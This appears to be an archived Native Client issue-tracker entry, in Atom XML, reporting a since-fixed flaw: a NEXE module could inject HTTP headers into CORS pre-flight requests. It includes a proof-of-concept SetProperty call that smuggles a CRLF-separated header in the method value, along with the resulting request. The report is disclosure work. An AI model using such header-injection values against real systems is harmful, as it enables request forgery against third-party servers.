<ns0:entry xmlns:ns0="http://www.w3.org/2005/Atom" xmlns:ns1="http://schemas.google.com/g/2005" xmlns:ns2="http://schemas.google.com/projecthosting/issues/2009" ns1:etag="W/&quot;DkMASH47eCl7ImA9WhNUGEg.&quot;">
		<ns0:id>http://code.google.com/feeds/issues/p/nativeclient/issues/full/2024</ns0:id><ns0:author>
			<ns0:name>chris.ro...@gmail.com</ns0:name><ns0:uri>/u/109476958443797771315/</ns0:uri></ns0:author><ns0:content type="html">The PpbURLLoaderRpcServer::PPB_URLLoader_Open and PpbURLRequestInfoRpcServer::PPB_URLRequestInfo_SetProperty interfaces allow a NEXE module to configure various parameters for an HTTP request that the browser will make on its behalf. In order to perform cross domain requests Webkit is instructed by the PPAPI layer to do cross domain using the WebURLLoaderOptions::CrossOriginRequestPolicyUseAccessControl option. This means the browser will send a 'pre-flight' OPTIONS request to the third party server asking it what HTTP parameters may be set.

However a NEXE module can use the SetProperty call to inject headers into this request. You can reproduce the issue by modifying the tests/ppapi_geturl/url_load_request.cc example on line 168 to the following:

 PP_Bool set_method = request_interface_-&amp;gt;SetProperty(request_, PP_URLREQUESTPROPERTY_METHOD,
 Module::StrToVar( &amp;quot;POST\x0d\x0ax-csrf-token:\x20test1234&amp;quot;));

Which produce the following pre-flight CORS HTTP request to the third party server.


OPTIONS / HTTP/1.1
Host: 192.168.7.7
Connection: keep-alive
Access-Control-Request-Method: POST
x-csrf-token: test1234
Origin: http://127.0.0.1:43137
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.822.0 Safari/535.1
Access-Control-Request-Headers: Origin
Accept: */*
Referer: http://127.0.0.1:43137//scons-out/nacl-x86-32/staging/ppapi_geturl.html
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3</ns0:content><ns0:updated>2013-01-10T21:47:29.000Z</ns0:updated><ns0:published>2011-07-14T02:59:53.000Z</ns0:published><ns2:status>Fixed</ns2:status><ns2:owner>
			<ns2:uri>/u/106710594185928520364/</ns2:uri><ns2:username>bbu...@google.com</ns2:username></ns2:owner><ns2:cc>
			<ns2:uri>/u/brettw@chromium.org/</ns2:uri><ns2:username>brettw@chromium.org</ns2:username></ns2:cc><ns2:cc>
			<ns2:uri>/u/113511172007743761909/</ns2:uri><ns2:username>cstefan...@google.com</ns2:username></ns2:cc><ns2:cc>
			<ns2:uri>/u/110088500044003719179/</ns2:uri><ns2:username>jsc...@chromium.org</ns2:username></ns2:cc><ns2:cc>
			<ns2:uri>/u/abarth@chromium.org/</ns2:uri><ns2:username>abarth@chromium.org</ns2:username></ns2:cc><ns2:state>closed</ns2:state><ns0:title>PpbURLLoaderRpcServer::PPB_URLLoader_Open CORS request allows for header injection</ns0:title><ns2:label>Security</ns2:label><ns2:label>Pri-0</ns2:label><ns2:label>Mstone-14</ns2:label><ns2:label>Component-Pepper</ns2:label><ns2:label>Merge-Requested</ns2:label><ns0:link href="http://code.google.com/feeds/issues/p/nativeclient/issues/2024/comments/full" rel="replies" type="application/atom+xml" /><ns0:link href="http://code.google.com/p/nativeclient/issues/detail?id=2024" rel="alternate" type="text/html" /><ns0:link href="https://code.google.com/feeds/issues/p/nativeclient/issues/full/2024" rel="self" type="application/atom+xml" /><ns2:stars>1</ns2:stars><ns2:closedDate>2011-08-16T16:21:43.000Z</ns2:closedDate><ns2:id>2024</ns2:id></ns0:entry>